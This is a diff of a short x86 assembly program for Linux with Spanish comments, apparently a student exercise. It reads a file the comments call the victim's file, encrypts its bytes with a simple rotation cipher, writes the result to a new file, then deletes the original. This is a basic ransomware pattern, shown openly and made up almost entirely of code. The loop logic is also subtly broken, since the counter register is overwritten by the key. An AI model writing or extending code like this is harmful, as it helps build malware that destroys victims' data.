@@ -13,71 +13,72 @@ section .bss
 
 section .text 
     main:
-        ; Abrir el archivo de lectura
-        mov eax, 5              ; sys_open
+        ;Abrimos el archivo de lectura
+        mov eax, 5              ;sys_open
         mov ebx, archVictima
-        mov ecx, 2              ; 
-        mov edx, 777              ; Cuenta con todos los permisos
+        mov ecx, 0            ; El archivo se abrira en modo lectura
+        mov edx, 777              ;Cuenta con todos los permisos rwx
         int 0x80
 
-        mov [fd_lectura], eax   ; Guardar identificador de archivo de lectura
+        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de lectura
 
-        ; Abrir el archivo de cifrado
-        mov eax, 5              ; sys_open
+        ;Abrimos el archivo de cifrado
+        mov eax, 5              ;sys_open
         mov ebx, archCifrado
-        mov ecx, 641            ;(modo de escritura, crear si no existe, truncar el archivo)
-        mov edx, 777            ; Asignando todos los permisos
+        mov ecx, 641            ;(modo de escritura, crear si no existe)
+        mov edx, 777            ;Asignando todos los permisos
         int 0x80
 
-        mov [fd_cifrado], eax   ; Guardar identificador de archivo de cifrado
+        mov [fd_cifrado], eax   ;Guardamos el identificador de archivo de cifrado
 
-        ; Leer el contenido del archivo
+        ;Leer el contenido del archivo
         mov eax, 3
         mov ebx, [fd_lectura]
         mov ecx, buffer
         mov edx, tama_buffer
-        int 0x80                ; Leemos contenido del archivo
+        int 0x80                ;Aqui basicamente Leemos contenido del archivo
 
-        ; Cifrar contenido
-        mov esi, buffer        ; Puntero al inicio del buffer
-        xor ecx, ecx           ; Contador de posición inicializado en 0
+        ;Cifrar contenido
+        mov esi, buffer        ;Puntero al inicio del buffer
+        mov ecx, 0          ;Contador de posición inicializado en 0
 
     cifrar_loop:
-        movzx eax, byte [esi]  ; Cargar el caracter actual en AL
-        cmp al, 0              ; Verificar si se llegó al final del archivo
-        je fin_cifrar
+        movzx eax, byte [esi]  ;Cargamos el caracter actual en AL
+        cmp al, 0              ;VVerificamos si se llegó al final del archivo
+        je fin_cifrar          ;De ser el final del archivo, salta a fin_cifrar
 
-        add al, byte [key]    ; Sumar el valor de "key" al caracter actual
-        mov byte [esi], al    ; Guardar el caracter cifrado en el buffer
+        mov cl, byte [key]     ;Cargmos el valor de "key" en CL
+        ror al, cl             ;Rotamos a la derecha el valor de AL según CL->cl tiene un 3
+        mov byte [esi], al    ;Guardamos el caracter cifrado en el buffer
 
-        inc esi               ; Avanzar al siguiente caracter en el buffer
-        inc ecx               ; Incrementar el contador de posición
+        inc esi               ;Avanzamos al siguiente caracter en el buffer
+        inc ecx               ;Incrementamos el contador de posición
 
-        cmp ecx, edx          ; Comparar el contador con el tamaño del buffer
-        jl cifrar_loop        ; Si no se ha llegado al final del buffer, repetir el bucle
+        cmp ecx, edx          ;Comparamos el contador con el tamaño del buffer
+        jl cifrar_loop        ;Si no se ha llegado al final del buffer, continua en el ciclo
 
     fin_cifrar:
-        ; Escribir el contenido cifrado en el archivo de cifrado
-        mov eax, 4              ; sys_write
+        ;Escribiendo el contenido cifrado en el archivo de cifrado
+        mov eax, 4              ;sys_write
         mov ebx, [fd_cifrado]
         mov ecx, buffer
         mov edx, tama_buffer
-        int 0x80                ; Escribimos el contenido cifrado en el archivo de cifrado
+        int 0x80                ;Escribimos el contenido cifrado en el archivo de cifrado
 
-        ; Cerrar el archivo de lectura
-        mov eax, 6              ; sys_close
+        ;Cerramos el archivo de lectura
+        mov eax, 6              ;sys_close
         mov ebx, [fd_lectura]
         int 0x80
 
-        ; Cerrar el archivo de cifrado
-        mov eax, 6              ; sys_close
+        ;Cerramos el archivo de cifrado
+        mov eax, 6              ;sys_close
         mov ebx, [fd_cifrado]
         int 0x80
 
-        ; Eliminar el archivo original
-        mov eax, 10             ; sys_unlink
+        ;Eliminamos el archivo original->Archivo de a victima
+        mov eax, 10             ;sys_unlink
         mov ebx, archVictima
         int 0x80
 
-        mov eax, 1              ; Fin del programa
+        mov eax, 1              ;Fin del programa
         int 0x80
